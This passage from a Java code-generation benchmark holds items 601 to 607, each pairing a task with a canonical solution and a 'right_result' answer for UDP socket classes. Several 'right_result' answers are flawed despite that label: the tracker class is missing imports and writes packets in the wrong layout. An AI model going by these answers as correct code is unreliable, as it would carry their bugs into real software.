    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class HTTPUSocket {\n    private DatagramSocket ssdpUniSock;\n    private String localAddr;\n\n    public HTTPUSocket() throws SocketException {\n        this.ssdpUniSock = new DatagramSocket();\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) throws SocketException {\n        this.ssdpUniSock = new DatagramSocket(bindPort);\n        this.localAddr = bindAddr;\n    }\n\n    public HTTPUSocket(int bindPort) throws SocketException {\n        this.ssdpUniSock = new DatagramSocket(bindPort);\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        this.localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        return localAddr;\n    }\n\n    public boolean open() {\n        try {\n            this.ssdpUniSock = new DatagramSocket();\n            return true;\n        } catch (SocketException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean open(String bindAddr, int bindPort) {\n        try {\n            this.ssdpUniSock = new DatagramSocket(bindPort);\n            this.localAddr = bindAddr;\n            return true;\n        } catch (SocketException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean open(int bindPort) {\n        try {\n            this.ssdpUniSock = new DatagramSocket(bindPort);\n            return true;\n        } catch (SocketException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean close() {\n        if (ssdpUniSock != null && !ssdpUniSock.isClosed()) {\n            ssdpUniSock.close();\n            return true;\n        }\n        return false;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress inetAddr = InetAddress.getByName(addr);\n            byte[] buffer = msg.getBytes();\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, inetAddr, port);\n            ssdpUniSock.send(packet);\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public SSDPPacket receive() {\n        try {\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            ssdpUniSock.receive(packet);\n            return new SSDPPacket(packet.getData(), packet.getLength(), packet.getAddress().getHostAddress(), packet.getPort());\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}\n\nclass SSDPPacket {\n    private byte[] data;\n    private int length;\n    private String address;\n    private int port;\n\n    public SSDPPacket(byte[] data, int length, String address, int port) {\n        this.data = data;\n        this.length = length;\n        this.address = address;\n        this.port = port;\n    }\n\n    public byte[] getData() {\n        return data;\n    }\n\n    public int getLength() {\n        return length;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    @Override\n    public String toString() {\n        return \"SSDPPacket{\" +\n                \"data=\" + new String(data, 0, length) +\n                \", address='\" + address + '\\'' +\n                \", port=\" + port +\n                '}';\n    }\n}\n```"
  },
  {
    "Task_id": 601,
    "Instruction": "Task Description: Create a Java class that implements UDP communication functionality for sending and receiving packets, with configurable buffer size and port management.\n\nClass Description: The SnmpUdpHandler class provides UDP network communication capabilities for both sending and receiving datagram packets. It encapsulates the Java DatagramSocket functionality with additional convenience methods for packet handling and resource management.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- bufferSize: int - The size of the buffer used for receiving packets (default 1024)\n- address: InetAddress - The IP address the socket is bound to\n- port: int - The port number the socket is bound to\n\nMethods:\n- SnmpUdpHandler(int port, InetAddress address) -> void - Constructor that initializes the UDP socket bound to the specified port and address\n- sendPacket(byte[] data, InetAddress destination, int destPort) -> void - Sends a UDP packet containing the specified data to the given destination address and port\n- receivePacket() -> byte[] - Receives a UDP packet and returns its data as a byte array\n- close() -> void - Closes the UDP socket and releases system resources\n- getPort() -> int - Returns the local port number the socket is bound to\n- setBufferSize(int size) -> void - Sets the buffer size used for receiving packets",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class SnmpUdpHandler {\n\n    private DatagramSocket socket;\n    private int bufferSize = 1024;\n    private InetAddress address;\n    private int port;\n\n    public SnmpUdpHandler(int port, InetAddress address) throws SocketException {\n        this.port = port;\n        this.address = address;\n        this.socket = new DatagramSocket(port, address);\n    }\n\n    public void sendPacket(byte[] data, InetAddress destination, int destPort) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        byte[] buffer = new byte[bufferSize];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    public int getPort() {\n        return socket != null ? socket.getLocalPort() : port;\n    }\n\n    public void setBufferSize(int size) {\n        this.bufferSize = size;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SnmpUdpHandler {\n    private DatagramSocket socket;\n    private int bufferSize = 1024;\n    private InetAddress address;\n    private int port;\n\n    public SnmpUdpHandler(int port, InetAddress address) throws IOException {\n        this.port = port;\n        this.address = address;\n        this.socket = new DatagramSocket(port, address);\n    }\n\n    public void sendPacket(byte[] data, InetAddress destination, int destPort) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        byte[] buffer = new byte[bufferSize];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public int getPort() {\n        return socket.getLocalPort();\n    }\n\n    public void setBufferSize(int size) {\n        this.bufferSize = size;\n    }\n}\n```"
  },
  {
    "Task_id": 602,
    "Instruction": "Task Description: Create a UDP server class that listens for incoming packets on a specified port, processes the received data, and provides a method to retrieve the received message.\n\nClass Description: The UdpServer class implements a Runnable interface to handle UDP communication asynchronously. It creates a datagram socket bound to a specified port, receives incoming packets, stores the message content, and allows retrieval of the received message. The server operates with a timeout of 60 seconds.\n\nAttributes:\n- serverSocket: DatagramSocket - The UDP socket used for communication\n- message: String - Stores the received message from the client\n\nMethods:\n- UdpServer(int port) -> void - Constructor that initializes the UDP server on the specified port and starts the receiver thread\n- run() -> void - The thread's main execution method that receives incoming packets and processes the data\n- getMessage() -> String - Retrieves the received message after processing",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpServer implements Runnable {\n\n    private final DatagramSocket serverSocket;\n    private String message;\n\n    public UdpServer(int port) throws SocketException, InterruptedException {\n        serverSocket = new DatagramSocket(port);\n        serverSocket.setSoTimeout(60000);\n        final Thread thread = new Thread(this);\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public synchronized void run() {\n        final byte[] data = new byte[1024];\n        final DatagramPacket packet = new DatagramPacket(data, data.length);\n        try {\n            serverSocket.receive(packet);\n            message = new String(packet.getData()).trim();\n        } catch (IOException e) {\n            message = \"Exception while receiving sentry call. \" + e.getMessage();\n        }\n    }\n\n    public synchronized String getMessage() throws InterruptedException {\n        return message;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpServer implements Runnable {\n    private DatagramSocket serverSocket;\n    private String message;\n\n    public UdpServer(int port) throws Exception {\n        this.serverSocket = new DatagramSocket(port);\n        Thread receiverThread = new Thread(this);\n        receiverThread.start();\n    }\n\n    @Override\n    public void run() {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        try {\n            serverSocket.setSoTimeout(60000);\n            serverSocket.receive(packet);\n            InetAddress address = packet.getAddress();\n            int port = packet.getPort();\n            String receivedMessage = new String(packet.getData(), 0, packet.getLength());\n            this.message = \"Received message from \" + address.getHostAddress() + \":\" + port + \" - \" + receivedMessage;\n        } catch (Exception e) {\n            this.message = \"Error receiving message: \" + e.getMessage();\n        }\n    }\n\n    public String getMessage() {\n        return this.message;\n    }\n}\n```"
  },
  {
    "Task_id": 604,
    "Instruction": "Task Description: Implement a UDP client class in Java that can send UDP packets to a specified target address and port, with optional response waiting functionality.\n\nClass Description: The UDPClient class provides functionality to send UDP packets to a network target. It supports both fire-and-forget mode and request-response mode. The class manages its own socket and thread for asynchronous operation, and includes cleanup mechanisms.\n\nAttributes:\n- mUdpSocket: DatagramSocket - The UDP socket used for communication\n- mRunning: boolean - Flag indicating whether the client is currently active\n- mThread: Thread - The thread handling the UDP communication\n\nMethods:\n- sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) -> void - \n  Sends a UDP packet to the specified address and port. If waitResponse is true, it will wait for and deliver any response.\n  Parameters:\n    - targetAddress: String - The IP address or hostname of the target\n    - port: int - The destination port number\n    - data: String - The message to send\n    - waitResponse: boolean - Whether to wait for a response\n    - handler: ResponseHandler - Callback interface for handling responses or errors\n\n- stop() -> void - \n  Stops any ongoing UDP communication and cleans up resources. Closes the socket and interrupts the thread if active.\n\n- interface ResponseHandler - \n  Callback interface for handling responses or errors\n  Methods:\n    - onResponse(String response) -> void - Called when a response is received\n    - onError(String errorMessage) -> void - Called when an error occurs",
    "Canonical_solution": "import android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.CheckBox;\nimport android.widget.EditText;\nimport android.widget.Spinner;\nimport android.widget.Toast;\nimport android.widget.ToggleButton;\n\nimport org.csploit.android.R;\nimport org.csploit.android.core.Plugin;\nimport org.csploit.android.core.System;\nimport org.csploit.android.net.Target;\nimport org.csploit.android.net.Target.Type;\n\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket mUdpSocket = null;\n    private boolean mRunning = false;\n    private Thread mThread = null;\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, final ResponseHandler handler) {\n        if (!mRunning) {\n            mRunning = true;\n\n            mThread = new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    String error = null;\n                    try {\n                        mUdpSocket = new DatagramSocket();\n                        DatagramPacket packet = new DatagramPacket(\n                                data.getBytes(), data.length(),\n                                System.getCurrentTarget().getAddress(), port);\n\n                        mUdpSocket.send(packet);\n\n                        if (waitResponse) {\n                            byte[] buffer = new byte[1024];\n                            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                            mUdpSocket.receive(response);\n                            final String responseText = new String(buffer);\n                            handler.onResponse(responseText);\n                        }\n                    } catch (Exception e) {\n                        error = e.getMessage();\n                    } finally {\n                        if (mUdpSocket != null) {\n                            mUdpSocket.close();\n                        }\n                        mRunning = false;\n                        if (error != null) {\n                            handler.onError(error);\n                        }\n                    }\n                }\n            });\n\n            mThread.start();\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        try {\n            if (mThread != null && mThread.isAlive()) {\n                if (mUdpSocket != null)\n                    mUdpSocket.close();\n                mThread.interrupt();\n                mThread = null;\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPClient {\n    private DatagramSocket mUdpSocket;\n    private boolean mRunning;\n    private Thread mThread;\n\n    public UDPClient() throws IOException {\n        mUdpSocket = new DatagramSocket();\n        mRunning = false;\n        mThread = null;\n    }\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) {\n        if (!mRunning) return;\n\n        try {\n            InetAddress inetAddress = InetAddress.getByName(targetAddress);\n            byte[] sendData = data.getBytes();\n\n            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, inetAddress, port);\n            mUdpSocket.send(sendPacket);\n\n            if (waitResponse) {\n                byte[] receiveData = new byte[1024];\n                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n                mUdpSocket.receive(receivePacket);\n                String response = new String(receivePacket.getData(), 0, receivePacket.getLength());\n                handler.onResponse(response);\n            }\n        } catch (IOException e) {\n            handler.onError(e.getMessage());\n        }\n    }\n\n    public void start() {\n        if (mRunning) return;\n\n        mRunning = true;\n        mThread = new Thread(() -> {\n            while (mRunning) {\n                // Placeholder for asynchronous operations if needed\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            }\n        });\n        mThread.start();\n    }\n\n    public void stop() {\n        mRunning = false;\n        mThread.interrupt();\n        try {\n            mUdpSocket.close();\n        } catch (Exception e) {\n            // Handle exception if necessary\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}\n```"
  },
  {
    "Task_id": 605,
    "Instruction": "Task Description: Implement a UDP-based tracker server that handles client connections and announcements for a peer-to-peer network, managing connection IDs and responding to client requests with appropriate status information.\n\nClass Description: SingleClientUdpTracker is a UDP server implementation that simulates a BitTorrent tracker, handling client connect and announce requests while maintaining connection state and expiration.\n\nAttributes:\n- CONNECTION_EXPIRATION_TIME: [Duration] - Maximum duration before a connection expires\n- EPHEMERAL_CONNECTION_ID: [long] - Magic number used for initial connection requests\n- CONNECT_CODE: [int] - Action code for connection requests\n- ANNOUNCE_CODE: [int] - Action code for announce requests\n- ERROR_CODE: [int] - Action code for error responses\n- serverSocket: [DatagramSocket] - UDP socket for communication\n- interval: [int] - Announce interval to send to clients\n- leechers: [int] - Number of leechers to report\n- seeders: [int] - Number of seeders to report\n- shutdown: [boolean] - Flag to control server shutdown\n- currentConnection: [long] - Current active connection ID\n- connectedOn: [long] - Timestamp of when current connection was established\n\nMethods:\n- SingleClientUdpTracker([int interval, int leechers, int seeders]) -> [void] - Constructor that initializes the UDP socket with random port and sets tracker parameters\n- getServerAddress() -> [SocketAddress] - Returns the local socket address of the server\n- run() -> [void] - Main server loop that receives requests and sends responses\n- processRequest([byte[] requestData]) -> [byte[]] - Processes incoming UDP packets and generates appropriate responses\n- generateConnectionId() -> [long] - Generates a new random connection ID\n- createConnectResponse([long connectionId, int transactionId]) -> [byte[]] - Creates a connect response packet\n- createAnnounceResponse([long connectionId, int transactionId]) -> [byte[]] - Creates an announce response packet\n- createError([int transactionId, String message]) -> [byte[]] - Creates an error response packet\n- shutdown() -> [void] - Shuts down the server and closes the socket",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport java.util.Arrays;\nimport java.util.Random;\n\npublic class SingleClientUdpTracker {\n\n    private static final Duration CONNECTION_EXPIRATION_TIME = Duration.ofMinutes(2);\n    private static final long EPHEMERAL_CONNECTION_ID = 0x41727101980L;\n\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 3;\n\n    private final DatagramSocket serverSocket;\n    private final int interval;\n    private final int leechers;\n    private final int seeders;\n\n    private volatile boolean shutdown;\n    private volatile long currentConnection;\n    private volatile long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) throws SocketException {\n        this.serverSocket = new DatagramSocket(new InetSocketAddress(Inet4Address.getLoopbackAddress(), 0));\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() {\n        byte[] rbuf = new byte[8192];\n        DatagramPacket received = new DatagramPacket(rbuf, rbuf.length);\n        try {\n            serverSocket.receive(received);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n\n        byte[] response = processRequest(Arrays.copyOfRange(rbuf, 0, received.getLength()));\n        DatagramPacket sent = new DatagramPacket(response, response.length, received.getSocketAddress());\n        try {\n            serverSocket.send(sent);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        long connectionId = Protocols.readLong(requestData, 0);\n        int action = Protocols.readInt(requestData, 8);\n        int transactionId = Protocols.readInt(requestData, 12);\n        boolean connectionExpired = System.currentTimeMillis() - connectedOn > CONNECTION_EXPIRATION_TIME.toMillis();\n\n        switch (action) {\n            case CONNECT_CODE: {\n                if (connectionId != EPHEMERAL_CONNECTION_ID) {\n                    return createError(transactionId,\n                            \"Connect request should use \" + EPHEMERAL_CONNECTION_ID + \" as connection ID\");\n                } else if (!connectionExpired) {\n                    return createError(transactionId, \"Connection is not expired yet: \" + connectionId);\n                }\n                currentConnection = generateConnectionId();\n                connectedOn = System.currentTimeMillis();\n                return createConnectResponse(currentConnection, transactionId);\n            }\n            case ANNOUNCE_CODE: {\n                if (currentConnection != connectionId) {\n                    return createError(transactionId, \"Unknown connection: \" + connectionId);\n                } else if (connectionExpired) {\n                    return createError(transactionId, \"Connection expired: \" + connectionId);\n                }\n                return createAnnounceResponse(currentConnection, transactionId);\n            }\n            default: {\n                return createError(transactionId, \"Unsupported action: \" + action);\n            }\n        }\n    }\n\n    private long generateConnectionId() {\n        return new Random(System.currentTimeMillis()).nextLong();\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 8];\n        System.arraycopy(Protocols.getIntBytes(CONNECT_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getLongBytes(connectionId), 0, data, 8, 8);\n        return data;\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 4 + 4 + 4];\n        System.arraycopy(Protocols.getIntBytes(ANNOUNCE_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getIntBytes(interval), 0, data, 8, 4);\n        System.arraycopy(Protocols.getIntBytes(leechers), 0, data, 12, 4);\n        System.arraycopy(Protocols.getIntBytes(seeders), 0, data, 16, 4);\n        return data;\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        byte[] messageBytes = message.getBytes(StandardCharsets.US_ASCII);\n        byte[] data = new byte[4 + 4 + messageBytes.length];\n        System.arraycopy(Protocols.getIntBytes(ERROR_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(messageBytes, 0, data, 8, messageBytes.length);\n        return data;\n    }\n\n    public void shutdown() {\n        this.shutdown = true;\n        this.serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class SingleClientUdpTracker {\n    private static final Duration CONNECTION_EXPIRATION_TIME = Duration.ofMinutes(5);\n    private static final long EPHEMERAL_CONNECTION_ID = 0x41727166;\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 2;\n\n    private DatagramSocket serverSocket;\n    private int interval;\n    private int leechers;\n    private int seeders;\n    private boolean shutdown;\n    private long currentConnection;\n    private long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) throws SocketException {\n        this.serverSocket = new DatagramSocket();\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n        this.shutdown = false;\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() throws IOException {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (!shutdown) {\n            serverSocket.receive(packet);\n            byte[] requestData = Arrays.copyOfRange(packet.getData(), 0, packet.getLength());\n            byte[] responseData = processRequest(requestData);\n            DatagramPacket responsePacket = new DatagramPacket(responseData, responseData.length, packet.getSocketAddress());\n            serverSocket.send(responsePacket);\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        // Simplified processing logic for demonstration\n        ByteBuffer buffer = ByteBuffer.wrap(requestData);\n        int action = buffer.getInt();\n\n        if (action == CONNECT_CODE) {\n            long connectionId = generateConnectionId();\n            currentConnection = connectionId;\n            connectedOn = System.currentTimeMillis();\n            return createConnectResponse(connectionId, buffer.getInt());\n        } else if (action == ANNOUNCE_CODE && !shutdown && isConnectionValid()) {\n            return createAnnounceResponse(currentConnection, buffer.getInt());\n        } else {\n            return createError(buffer.getInt(), \"Invalid request\");\n        }\n    }\n\n    private long generateConnectionId() {\n        return ThreadLocalRandom.current().nextLong();\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        ByteBuffer buffer = ByteBuffer.allocate(16);\n        buffer.putInt(CONNECT_CODE);\n        buffer.putLong(EPHEMERAL_CONNECTION_ID);\n        buffer.putLong(connectionId);\n        buffer.putInt(transactionId);\n        return buffer.array();\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        ByteBuffer buffer = ByteBuffer.allocate(32);\n        buffer.putInt(ANNOUNCE_CODE);\n        buffer.putLong(connectionId);\n        buffer.putInt(interval);\n        buffer.putInt(leechers);\n        buffer.putInt(seeders);\n        buffer.putInt(transactionId);\n        return buffer.array();\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        ByteBuffer buffer = ByteBuffer.allocate(16 + message.length());\n        buffer.putInt(ERROR_CODE);\n        buffer.putInt(transactionId);\n        buffer.put(message.getBytes());\n        return buffer.array();\n    }\n\n    private boolean isConnectionValid() {\n        return System.currentTimeMillis() - connectedOn < CONNECTION_EXPIRATION_TIME.toMillis();\n    }\n\n    public void shutdown() {\n        this.shutdown = true;\n        serverSocket.close();\n    }\n}\n```"
  },
  {
    "Task_id": 606,
    "Instruction": "Task Description: Create a Java class for handling UDP communication that can both send and receive datagram packets, with proper socket management and error handling.\n\nClass Description: The UdpCommunicationHandler class provides a wrapper for Java's UDP socket functionality, enabling both sending and receiving of datagram packets. It manages socket lifecycle and provides status checking methods.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket for communication\n- bindAddress: InetSocketAddress - The address and port to which the socket is bound\n\nMethods:\n- UdpCommunicationHandler(String bindIp, int bindPort) -> void - Constructor that initializes and binds the UDP socket to the specified IP and port\n- sendData(byte[] data, String targetIp, int targetPort) -> void - Sends the provided data as a UDP packet to the specified target IP and port\n- receiveData() -> byte[] - Receives incoming UDP packet data and returns it as a byte array\n- close() -> void - Closes the UDP socket if it's open\n- isBound() -> boolean - Returns whether the socket is currently bound to an address\n- isClosed() -> boolean - Returns whether the socket is closed",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws SocketException {\n        this.bindAddress = new InetSocketAddress(bindIp, bindPort);\n        this.socket = new DatagramSocket(null);\n        this.socket.bind(this.bindAddress);\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws IOException {\n        InetSocketAddress targetAddress = new InetSocketAddress(targetIp, targetPort);\n        DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress);\n        this.socket.send(packet);\n    }\n\n    public byte[] receiveData() throws IOException {\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        this.socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (this.socket != null && !this.socket.isClosed()) {\n            this.socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return this.socket != null && this.socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return this.socket == null || this.socket.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws Exception {\n        this.bindAddress = new InetSocketAddress(InetAddress.getByName(bindIp), bindPort);\n        this.socket = new DatagramSocket(this.bindAddress);\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n        DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, targetPort);\n        socket.send(packet);\n    }\n\n    public byte[] receiveData() throws Exception {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return socket != null && socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return socket == null || socket.isClosed();\n    }\n}\n```"
  },
  {
    "Task_id": 607,
    "Instruction": "Task Description: Implement a UDP-based communication handler class that can act as a server to receive files and process initialization messages from clients.\n\nClass Description: The UdpCommunicationHandler class provides functionality to create a UDP server that listens on a specified port for incoming messages. It handles two types of messages: initialization messages for receiver setup and file information messages. The class manages the UDP socket lifecycle and includes methods for processing received messages.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- startFileReceiverServer(int serverPort) -> void - Starts the UDP server on the specified port to receive messages. Continuously listens for incoming packets and processes them based on their content.\n  Input: serverPort - int - The port number to bind the server to\n  Output: None (throws Exception if socket operations fail)\n  \n- handleReceiverInit(InetAddress inetAddress, int port) -> void - Handles the receiver initialization logic when an initialization message is received.\n  Input: \n    inetAddress - InetAddress - The client's IP address\n    port - int - The client's port number\n  Output: None\n  \n- parseFileInfo(String msg) -> void - Parses and processes file information messages received from clients.\n  Input: msg - String - The received message containing file information\n  Output: None\n  \n- closeSocket() -> void - Properly closes and cleans up the UDP socket resources.\n  Input: None\n  Output: None",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] receiveData = new byte[1024];\n        \n        while(true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            mDatagramSocket.receive(receivePacket);\n            String msg = new String(receivePacket.getData()).trim();\n            InetAddress inetAddress = receivePacket.getAddress();\n            int port = receivePacket.getPort();\n            \n            if(msg != null && msg.startsWith(Constant.MSG_FILE_RECEIVER_INIT)) {\n                handleReceiverInit(inetAddress, port);\n            } else {\n                parseFileInfo(msg);\n            }\n        }\n    }\n\n    private void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Handle receiver initialization logic\n    }\n\n    private void parseFileInfo(String msg) {\n        // Parse file information\n    }\n\n    public void closeSocket() {\n        if(mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] buffer = new byte[1024];\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            mDatagramSocket.receive(packet);\n            String receivedMessage = new String(packet.getData(), 0, packet.getLength());\n            InetAddress senderAddress = packet.getAddress();\n            int senderPort = packet.getPort();\n\n            if (receivedMessage.startsWith(\"INIT\")) {\n                handleReceiverInit(senderAddress, senderPort);\n            } else if (receivedMessage.startsWith(\"FILEINFO\")) {\n                parseFileInfo(receivedMessage);\n            }\n        }\n    }\n\n    public void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Implementation for handling receiver initialization\n        System.out.println(\"Initialization message received from \" + inetAddress.getHostAddress() + \":\" + port);\n    }\n\n    public void parseFileInfo(String msg) {\n        // Implementation for parsing file info\n        System.out.println(\"File info received: \" + msg);\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null && !mDatagramSocket.isClosed()) {\n            mDatagramSocket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 608,
